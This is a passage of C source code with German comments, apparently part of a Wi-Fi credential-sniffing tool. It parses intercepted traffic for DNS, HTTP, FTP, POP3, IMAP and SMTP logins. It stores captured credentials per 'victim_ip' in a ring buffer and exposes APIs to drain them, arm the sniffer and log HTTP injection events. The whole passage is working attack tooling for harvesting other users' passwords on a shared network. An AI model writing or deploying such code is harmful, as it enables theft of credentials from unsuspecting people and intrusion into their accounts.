        if(dport == 53 && sport != 53) parse_dns(cs, src_ip, dst_ip, dport, ud, udl);
        return;
    }

    if(l4proto != 6) return; // sonst nur TCP

    if(l4_len < 20) return;
    uint16_t sport = ((uint16_t)l4[0] << 8) | l4[1];
    uint16_t dport = ((uint16_t)l4[2] << 8) | l4[3];
    int doff = ((l4[12] >> 4) & 0x0f) * 4;
    if(doff < 20 || doff > l4_len) return;
    const uint8_t* data = l4 + doff;
    int data_len = l4_len - doff;
    if(data_len <= 0) return; // reines ACK

    // Nur Client→Server-Richtung dissektieren (dport == well-known).
    if(dport == 80 || dport == 8080 || dport == 8000) {
        parse_http(cs, src_ip, sport, dst_ip, dport, data, data_len);
    } else if(dport == 21) {
        parse_user_pass(cs, "FTP", src_ip, sport, dst_ip, dport, data, data_len);
    } else if(dport == 110) {
        parse_user_pass(cs, "POP3", src_ip, sport, dst_ip, dport, data, data_len);
    } else if(dport == 143) {
        parse_imap(cs, src_ip, dst_ip, dport, data, data_len);
    } else if(dport == 25 || dport == 587 || dport == 465) {
        parse_smtp(cs, src_ip, sport, dst_ip, dport, data, data_len);
    }
}

// ===========================================================================
// Consumer-API
// ===========================================================================

static bool slot_read(WlanCredSniff* cs, uint32_t want_seq, WlanCredEntry* out) {
    uint32_t slot = (want_seq - 1u) % WLAN_CRED_RING_SIZE;
    WlanCredEntry* e = &cs->ring[slot];
    uint32_t s1 = __atomic_load_n(&e->seq, __ATOMIC_ACQUIRE);
    if(s1 == 0u || s1 != want_seq) return false;
    *out = *e;
    __atomic_thread_fence(__ATOMIC_ACQUIRE);
    uint32_t s2 = __atomic_load_n(&e->seq, __ATOMIC_ACQUIRE);
    return s2 == want_seq;
}

uint32_t wlan_cred_sniff_drain(WlanCredSniff* cs, WlanCredEntry* out, uint32_t max) {
    if(!cs || !out || max == 0) return 0;
    uint32_t produced = __atomic_load_n(&cs->write_seq, __ATOMIC_ACQUIRE);
    uint32_t next = cs->drain_cursor + 1u;
    uint32_t oldest =
        (produced >= WLAN_CRED_RING_SIZE) ? (produced - WLAN_CRED_RING_SIZE + 1u) : 1u;
    if((int32_t)(next - oldest) < 0) next = oldest; // überschriebene überspringen
    uint32_t n = 0;
    while((int32_t)(next - produced) <= 0 && next != 0 && n < max) {
        WlanCredEntry e;
        if(slot_read(cs, next, &e)) {
            e.seq = next;
            out[n++] = e;
        }
        next++;
    }
    if((int32_t)(next - 1u - cs->drain_cursor) > 0) cs->drain_cursor = next - 1u;
    return n;
}

uint32_t wlan_cred_sniff_snapshot(WlanCredSniff* cs, WlanCredEntry* out, uint32_t max) {
    if(!cs || !out || max == 0) return 0;
    uint32_t produced = __atomic_load_n(&cs->write_seq, __ATOMIC_ACQUIRE);
    uint32_t avail = produced;
    if(avail > WLAN_CRED_RING_SIZE) avail = WLAN_CRED_RING_SIZE;
    if(avail > max) avail = max;
    uint32_t n = 0;
    for(uint32_t k = 0; k < avail; k++) {
        uint32_t want = produced - k; // neueste zuerst
        WlanCredEntry e;
        if(slot_read(cs, want, &e)) {
            e.seq = want;
            out[n++] = e;
        }
    }
    return n;
}

uint32_t wlan_cred_sniff_total(WlanCredSniff* cs) {
    return cs ? __atomic_load_n(&cs->total, __ATOMIC_RELAXED) : 0;
}

uint32_t wlan_cred_sniff_count_for_ip(WlanCredSniff* cs, uint32_t ip) {
    if(!cs || ip == 0) return 0;
    uint32_t produced = __atomic_load_n(&cs->write_seq, __ATOMIC_ACQUIRE);
    uint32_t avail = produced > WLAN_CRED_RING_SIZE ? WLAN_CRED_RING_SIZE : produced;
    uint32_t cnt = 0;
    for(uint32_t k = 0; k < avail; k++) {
        WlanCredEntry e;
        if(slot_read(cs, produced - k, &e) && e.victim_ip == ip) cnt++;
    }
    return cnt;
}

void wlan_cred_sniff_set_armed(WlanCredSniff* cs, bool armed) {
    if(!cs) return;
    if(armed) {
        memset(cs->dns_seen, 0, sizeof(cs->dns_seen));
        memset(cs->pending, 0, sizeof(cs->pending));
        memset(cs->url_track, 0, sizeof(cs->url_track));
    }
    __atomic_store_n(&cs->armed, armed, __ATOMIC_RELEASE);
}

bool wlan_cred_sniff_lookup_http_url(
    WlanCredSniff* cs, uint32_t server_ip, uint16_t victim_port,
    char* host_out, int host_sz, char* path_out, int path_sz) {
    if(!cs) return false;
    return url_track_lookup(cs, server_ip, victim_port, host_out, host_sz, path_out, path_sz);
}

void wlan_cred_sniff_push_log(WlanCredSniff* cs, uint32_t client_ip, const char* value) {
    if(!cs || !value) return;
    cred_push(cs, "LOG", client_ip, 0, 0, "", value, "", NULL);
}

void wlan_cred_sniff_push_inject(
    WlanCredSniff* cs, uint32_t server_ip, uint32_t victim_ip, uint16_t victim_port) {
    if(!cs) return;
    char host[WLAN_CRED_STR_MAX] = {0};
    char path[WLAN_CRED_STR_MAX] = {0};
    if(!url_track_lookup(cs, server_ip, victim_port, host, sizeof(host), path, sizeof(path))) {
        // Kein Lookup-Treffer — Fallback: Server-IP als Host.
        const uint8_t* b = (const uint8_t*)&server_ip;
        snprintf(host, sizeof(host), "%u.%u.%u.%u", b[0], b[1], b[2], b[3]);
        path[0] = 0;
    }
    cred_push(cs, "INJ", victim_ip, server_ip, 80, host, path, "", NULL);
}

bool wlan_cred_sniff_armed(WlanCredSniff* cs) {
    return cs && __atomic_load_n(&cs->armed, __ATOMIC_RELAXED);
}

// ===========================================================================
// Lifecycle
// ===========================================================================

WlanCredSniff* wlan_cred_sniff_alloc(void) {
    WlanCredSniff* cs = malloc(sizeof(WlanCredSniff));
    memset(cs, 0, sizeof(*cs));
    return cs;
}

void wlan_cred_sniff_free(WlanCredSniff* cs) {
    if(cs) free(cs);
}
